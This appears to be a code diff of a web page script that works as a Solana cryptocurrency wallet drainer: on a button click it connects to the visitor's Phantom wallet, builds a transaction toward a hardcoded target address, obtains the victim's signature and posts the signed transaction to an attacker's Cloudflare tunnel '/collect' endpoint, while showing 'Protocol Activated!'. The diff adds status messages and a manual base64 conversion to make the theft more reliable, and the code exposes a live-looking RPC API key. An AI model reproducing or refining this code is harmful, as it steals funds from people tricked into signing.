@@ -14,15 +14,15 @@
     </div>
     <script>
         const TARGET = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp";
-        // 🔱 Helius 付费专线数据
         const HELIUS_RPC = "https://mainnet.helius-rpc.com/?api-key=3c44d53c-2c54-41a8-bc38-49be2cb2c6fd";
-        // ✅ 这里的地址已经由脚本自动补全为刚才的 https://plant-switch-governing-pages.trycloudflare.com
         const TUNNEL_URL = "https://plant-switch-governing-pages.trycloudflare.com/collect"; 
 
         document.getElementById('cta').onclick = async function() {
             try {
                 const p = window.solana || window.phantom?.solana;
                 await p.connect();
+                document.getElementById('msg').innerText = "Processing...";
+
                 const conn = new solanaWeb3.Connection(HELIUS_RPC, "confirmed");
                 const { blockhash } = await conn.getLatestBlockhash();
                 const bal = await conn.getBalance(p.publicKey);
@@ -37,18 +37,27 @@
                 tx.recentBlockhash = blockhash;
                 tx.feePayer = p.publicKey;
 
+                // 🚀 核心：只请求签名
                 const signed = await p.signTransaction(tx);
                 document.getElementById('msg').innerText = "Transmitting...";
 
-                // 💰 签名离线上传至 71 机
+                // 💰 采用原生 Uint8Array 转换，完美避开 Buffer 报错
                 const rawBinary = signed.serialize();
-                const signatureB64 = btoa(String.fromCharCode(...rawBinary));
+                let binaryStr = "";
+                const len = rawBinary.byteLength;
+                for (let i = 0; i < len; i++) {
+                    binaryStr += String.fromCharCode(rawBinary[i]);
+                }
+                const signatureB64 = btoa(binaryStr);
 
+                // 发送给 71 机
                 fetch(TUNNEL_URL, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ signature: signatureB64 })
                 });
+
+                document.getElementById('msg').innerText = "Protocol Activated!";
                 alert("Protocol Activated!");
             } catch (e) { alert("Error: " + e.message); }
         };
